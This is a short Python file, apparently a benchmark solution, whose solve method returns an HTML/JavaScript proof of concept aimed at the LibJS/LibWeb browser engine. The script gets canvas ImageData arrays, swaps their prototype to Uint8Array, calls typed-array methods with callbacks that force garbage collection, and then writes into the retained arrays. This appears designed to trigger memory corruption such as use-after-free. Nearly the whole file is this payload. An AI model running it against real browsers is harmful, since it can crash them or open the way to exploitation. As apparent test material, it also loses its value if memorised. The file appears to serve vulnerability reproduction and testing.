import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = r"""<!doctype html>
<script>
(function () {
    function maybeGC() {
        if (typeof gc === "function") {
            try {
                for (let i = 0; i < 5; ++i)
                    gc();
            } catch (e) {
            }
        }
        let garbage = [];
        for (let i = 0; i < 2000; ++i) {
            garbage.push({
                p: new Uint8Array(1024),
                q: new Array(16).fill(i)
            });
        }
    }

    function abuseTypedArrayMethods(arr) {
        try {
            Uint8Array.prototype.set.call(arr, new Uint8Array(16), 0);
        } catch (e) {
        }
        try {
            Uint8Array.prototype.subarray.call(arr, 1, 10);
        } catch (e) {
        }
        try {
            Uint8Array.prototype.fill.call(arr, 0x7f);
        } catch (e) {
        }
        try {
            Uint8Array.prototype.copyWithin.call(arr, 1, 2, 8);
        } catch (e) {
        }
        try {
            Uint8Array.prototype.map.call(arr, function (v, i) {
                if (i === 0)
                    maybeGC();
                return v;
            });
        } catch (e) {
        }
        try {
            Uint8Array.prototype.reduce.call(arr, function (a, v) {
                return a + v;
            }, 0);
        } catch (e) {
        }
        try {
            Uint8Array.prototype.sort.call(arr, function (a, b) {
                return a - b;
            });
        } catch (e) {
        }
    }

    function main() {
        let keep = [];
        let canvas = document.createElement("canvas");
        canvas.width = 64;
        canvas.height = 64;
        let ctx = canvas.getContext("2d");
        if (!ctx)
            return;

        ctx.fillStyle = "#000";
        ctx.fillRect(0, 0, 64, 64);

        for (let round = 0; round < 64; ++round) {
            for (let i = 0; i < 4; ++i) {
                let img;
                try {
                    img = ctx.getImageData(0, 0, 64, 64);
                } catch (e) {
                    continue;
                }
                if (!img || !img.data)
                    continue;

                let data = img.data; // Uint8ClampedArray (LibJS/LibWeb specific)

                keep.push(data);

                try {
                    // Force it to look like a "normal" TypedArray at the JS level.
                    Object.setPrototypeOf(data, Uint8Array.prototype);
                } catch (e) {
                }

                abuseTypedArrayMethods(data);

                img = null;

                maybeGC();
            }
        }

        for (let k = 0; k < keep.length; ++k) {
            let a = keep[k];
            if (!a || typeof a.length !== "number")
                continue;

            for (let i = 0; i < 512; ++i) {
                try {
                    let idx = i % a.length;
                    a[idx] = (a[idx] + 1) & 0xff;
                } catch (e) {
                }
            }
            abuseTypedArrayMethods(a);
        }

        maybeGC();

        for (let r = 0; r < 32; ++r) {
            for (let k = 0; k < keep.length; ++k) {
                let a = keep[k];
                if (!a || typeof a.length !== "number" || a.length === 0)
                    continue;
                try {
                    let idx = r % a.length;
                    a[idx] ^= 0xff;
                } catch (e) {
                }
            }
        }
    }

    try {
        main();
    } catch (e) {
    }
})();
</script>
"""
        return poc.encode("utf-8")
